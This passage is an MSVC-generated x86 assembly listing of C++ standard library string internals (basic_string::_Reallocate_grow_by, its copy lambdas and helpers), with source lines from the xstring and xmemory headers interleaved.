  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 0f	 cmp	 DWORD PTR __Old_capacity$[ebp], 15 ; 0000000fH
  00099	76 4b		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	8b 4d 14	 mov	 ecx, DWORD PTR _<_Args_1>$[ebp]
  000a6	51		 push	 ecx
  000a7	8b 55 10	 mov	 edx, DWORD PTR _<_Args_0>$[ebp]
  000aa	52		 push	 edx
  000ab	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  000ae	50		 push	 eax
  000af	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000b2	51		 push	 ecx
  000b3	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  000b8	83 c4 04	 add	 esp, 4
  000bb	50		 push	 eax
  000bc	8b 55 d8	 mov	 edx, DWORD PTR __Raw_new$[ebp]
  000bf	52		 push	 edx
  000c0	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000c3	e8 00 00 00 00	 call	 ??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c8	8b 45 e4	 mov	 eax, DWORD PTR __Old_capacity$[ebp]
  000cb	50		 push	 eax
  000cc	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000cf	51		 push	 ecx
  000d0	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  000d3	52		 push	 edx
  000d4	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
  000d9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000dc	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  000df	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000e2	89 08		 mov	 DWORD PTR [eax], ecx

; 4832 :         } else {

  000e4	eb 2c		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000e6	8b 55 14	 mov	 edx, DWORD PTR _<_Args_1>$[ebp]
  000e9	52		 push	 edx
  000ea	8b 45 10	 mov	 eax, DWORD PTR _<_Args_0>$[ebp]
  000ed	50		 push	 eax
  000ee	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  000f1	51		 push	 ecx
  000f2	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  000f5	52		 push	 edx
  000f6	8b 45 d8	 mov	 eax, DWORD PTR __Raw_new$[ebp]
  000f9	50		 push	 eax
  000fa	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000fd	e8 00 00 00 00	 call	 ??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00102	8d 4d f0	 lea	 ecx, DWORD PTR __New_ptr$[ebp]
  00105	51		 push	 ecx
  00106	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00109	52		 push	 edx
  0010a	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
  0010f	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  00112	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  00115	8b e5		 mov	 esp, ebp
  00117	5d		 pop	 ebp
  00118	c2 10 00	 ret	 16			; 00000010H
??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Ptr$ = 20						; size = 4
__Count$ = 24						; size = 4
??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z PROC ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator(), COMDAT
; _this$ = ecx

; 3323 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  00009	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);

  0001d	8b 45 18	 mov	 eax, DWORD PTR __Count$[ebp]
  00020	50		 push	 eax
  00021	8b 4d 14	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00024	51		 push	 ecx
  00025	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00028	03 55 10	 add	 edx, DWORD PTR __Old_size$[ebp]
  0002b	52		 push	 edx
  0002c	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  00031	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  00034	c6 45 ff 00	 mov	 BYTE PTR $T1[ebp], 0
  00038	8d 45 ff	 lea	 eax, DWORD PTR $T1[ebp]
  0003b	50		 push	 eax
  0003c	8b 4d 10	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  0003f	03 4d 18	 add	 ecx, DWORD PTR __Count$[ebp]
  00042	03 4d 08	 add	 ecx, DWORD PTR __New_ptr$[ebp]
  00045	51		 push	 ecx
  00046	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0004b	83 c4 08	 add	 esp, 8

; 3323 :             },

  0004e	8b e5		 mov	 esp, ebp
  00050	5d		 pop	 ebp
  00051	c2 14 00	 ret	 20			; 00000014H
??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ENDP ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 1
??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 0f	 cmp	 DWORD PTR __Old_capacity$[ebp], 15 ; 0000000fH
  00099	76 48		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	0f b6 4d 10	 movzx	 ecx, BYTE PTR _<_Args_0>$[ebp]
  000a7	51		 push	 ecx
  000a8	8b 55 f4	 mov	 edx, DWORD PTR __Old_size$[ebp]
  000ab	52		 push	 edx
  000ac	8b 45 e0	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  000af	50		 push	 eax
  000b0	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  000b5	83 c4 04	 add	 esp, 4
  000b8	50		 push	 eax
  000b9	8b 4d d8	 mov	 ecx, DWORD PTR __Raw_new$[ebp]
  000bc	51		 push	 ecx
  000bd	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000c0	e8 00 00 00 00	 call	 ??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c5	8b 55 e4	 mov	 edx, DWORD PTR __Old_capacity$[ebp]
  000c8	52		 push	 edx
  000c9	8b 45 e0	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  000cc	50		 push	 eax
  000cd	8b 4d dc	 mov	 ecx, DWORD PTR __Al$[ebp]
  000d0	51		 push	 ecx
  000d1	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
  000d6	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000d9	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  000dc	8b 45 f0	 mov	 eax, DWORD PTR __New_ptr$[ebp]
  000df	89 02		 mov	 DWORD PTR [edx], eax

; 4832 :         } else {

  000e1	eb 29		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000e3	0f b6 4d 10	 movzx	 ecx, BYTE PTR _<_Args_0>$[ebp]
  000e7	51		 push	 ecx
  000e8	8b 55 f4	 mov	 edx, DWORD PTR __Old_size$[ebp]
  000eb	52		 push	 edx
  000ec	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  000ef	50		 push	 eax
  000f0	8b 4d d8	 mov	 ecx, DWORD PTR __Raw_new$[ebp]
  000f3	51		 push	 ecx
  000f4	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000f7	e8 00 00 00 00	 call	 ??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000fc	8d 55 f0	 lea	 edx, DWORD PTR __New_ptr$[ebp]
  000ff	52		 push	 edx
  00100	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00103	50		 push	 eax
  00104	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
  00109	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  0010c	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  0010f	8b e5		 mov	 esp, ebp
  00111	5d		 pop	 ebp
  00112	c2 0c 00	 ret	 12			; 0000000cH
??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Ch$ = 20						; size = 1
??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z PROC ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator(), COMDAT
; _this$ = ecx

; 4099 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4096 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  00009	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4097 :                 _Traits::assign(_New_ptr[_Old_size], _Ch);

  0001d	8d 45 14	 lea	 eax, DWORD PTR __Ch$[ebp]
  00020	50		 push	 eax
  00021	8b 4d 08	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00024	03 4d 10	 add	 ecx, DWORD PTR __Old_size$[ebp]
  00027	51		 push	 ecx
  00028	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0002d	83 c4 08	 add	 esp, 8

; 4098 :                 _Traits::assign(_New_ptr[_Old_size + 1], _Elem());

  00030	c6 45 ff 00	 mov	 BYTE PTR $T1[ebp], 0
  00034	8d 55 ff	 lea	 edx, DWORD PTR $T1[ebp]
  00037	52		 push	 edx
  00038	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0003b	8b 4d 08	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  0003e	8d 54 01 01	 lea	 edx, DWORD PTR [ecx+eax+1]
  00042	52		 push	 edx
  00043	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00048	83 c4 08	 add	 esp, 8

; 4099 :             },

  0004b	8b e5		 mov	 esp, ebp
  0004d	5d		 pop	 ebp
  0004e	c2 10 00	 ret	 16			; 00000010H
??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ENDP ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@D@std@@YAPADPAD@Z
_TEXT	SEGMENT
__Ptr$ = 8						; size = 4
??$_Unfancy@D@std@@YAPADPAD@Z PROC			; std::_Unfancy<char>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 36   :     return _Ptr;

  00003	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]

; 37   : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$_Unfancy@D@std@@YAPADPAD@Z ENDP			; std::_Unfancy<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PA_WAAPA_W@std@@YAXAAPA_W0@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
??$_Construct_in_place@PA_WAAPA_W@std@@YAXAAPA_W0@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Obj$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ??$addressof@PA_W@std@@YAPAPA_WAAPA_W@Z ; std::addressof<wchar_t *>
  0000d	83 c4 04	 add	 esp, 4
  00010	50		 push	 eax
  00011	6a 04		 push	 4
  00013	e8 00 00 00 00	 call	 ??2@YAPAXIPAX@Z		; operator new
  00018	83 c4 08	 add	 esp, 8
  0001b	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  0001e	8b 4d 0c	 mov	 ecx, DWORD PTR _<_Args_0>$[ebp]
  00021	51		 push	 ecx
  00022	e8 00 00 00 00	 call	 ??$forward@AAPA_W@std@@YAAAPA_WAAPA_W@Z ; std::forward<wchar_t * &>
  00027	83 c4 04	 add	 esp, 4
  0002a	8b 55 fc	 mov	 edx, DWORD PTR $T1[ebp]
  0002d	8b 00		 mov	 eax, DWORD PTR [eax]
  0002f	89 02		 mov	 DWORD PTR [edx], eax

; 256  :     }
; 257  : }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Construct_in_place@PA_WAAPA_W@std@@YAXAAPA_W0@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
_<_Args_1>$ = 20					; size = 2
??$_Reallocate_grow_by@V<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_c3135ae829aeedc0a8af1bd1e887c66a>,unsigned int,wchar_t>, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

